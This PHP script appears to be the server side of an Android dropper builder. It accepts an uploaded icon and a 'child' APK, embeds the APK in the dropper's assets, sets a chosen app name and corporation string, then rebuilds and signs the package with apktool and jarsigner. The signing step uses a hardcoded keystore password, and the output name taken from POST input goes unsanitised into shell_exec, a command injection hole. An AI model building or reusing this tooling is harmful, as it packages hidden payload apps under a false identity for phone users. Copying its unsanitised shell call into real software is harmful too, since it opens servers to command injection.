<?php
$pldropper = "filedropper";

$nameappdropper = $_POST["nameappdropper"];
$apknamedropper = $_POST["apknamedropper"];
$corporationname = $_POST["corporationname"];

#ChangeImagePng

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Directory where the ic_launcher.png is located
    $targetDirectory = "./" . $pldropper . "/res/drawable/"; // Update this path based on your project structure

    // Get the file details
    $fileName = basename($_FILES["appIconDropper"]["name"]);
    $targetFilePath = $targetDirectory . $fileName;
    $fileType = pathinfo($targetFilePath, PATHINFO_EXTENSION);

    // Check if the file is a PNG
    if ($fileType == "png") {

        // Upload the file
        if (move_uploaded_file($_FILES["appIconDropper"]["tmp_name"], $targetFilePath)) {
            echo "File uploaded successfully.";

            // Rename the uploaded file to ic_launcher.png
            $newFilePath = $targetDirectory . "myicon.png";
            if (rename($targetFilePath, $newFilePath)) {
                echo " Changed Icon.";
            } else {
                echo "Error renaming file.";
            }

        } else {
            echo "Error uploading file.";
        }

    } else {
        echo "Please upload a PNG file.";
    }
} else {
    echo "Invalid request.";
}


if ($_SERVER["REQUEST_METHOD"] == "POST") {


    $targetDirectory = "./" . $pldropper . "/assets/"; 

    $fileName = basename($_FILES["secdroppers"]["name"]);
    $targetFilePath = $targetDirectory . $fileName;
    $fileType = pathinfo($targetFilePath, PATHINFO_EXTENSION);

    if ($fileType == "apk") {

        if (move_uploaded_file($_FILES["secdroppers"]["tmp_name"], $targetFilePath)) {
            echo "File uploaded successfully.";

            $newFilePath = $targetDirectory . "childapp.apk";
            if (rename($targetFilePath, $newFilePath)) {
                echo " Chagned Apk.";
            } else {
                echo "Error renaming file.";
            }

        } else {
            echo "Error uploading file.";
        }

    } else {
        echo "Please upload a Apk file.";
    }
} else {
    echo "Invalid request.";
}

    
#ChangeName	
$nameappdropper = str_replace(["\r", "\n"], '', $nameappdropper);

$line = 4; // 
$replace = '    <string name="Myname">'.$nameappdropper.'</string>';

$file = file("./" . $pldropper . "/res/values/strings.xml");
$open = fopen("./" . $pldropper . "/res/values/strings.xml", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}

#corporation
$corporationname = str_replace(["\r", "\n"], '', $corporationname);

$line = 3; // 
$replace = '    <string name="Copyrights">'.$corporationname.'</string>';

$file = file("./" . $pldropper . "/res/values/strings.xml");
$open = fopen("./" . $pldropper . "/res/values/strings.xml", "w");

if ($open) {
    for ($i = 0; $i < count($file); $i++) {
        if (($i + 1) != $line) {
            fwrite($open, $file[$i]);
        } else {
            fwrite($open, $replace . "\r\n");
        }
    }
    fclose($open);
    echo "File modified successfully.";
} else {
    echo "Error opening the file.";
}


#compile
$apktoolPath = 'bin/java/apktool.jar';
$decompiledDir = $pldropper;
$outputApkPath = "apkdropper/{$apknamedropper}_droppers.apk";

$command = "java -jar {$apktoolPath} b {$decompiledDir} -o {$outputApkPath}";
$result = shell_exec($command);

if ($result === null) {
    // error build
} else {
    // successfully build
}

$command = "jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore keystore.jks -storepass 12345678 $outputApkPath mykey";
$result = shell_exec($command);

if ($result === null) {
    // error sign
} else {
    // successfully sign
}

$result = shell_exec($command);



?> 

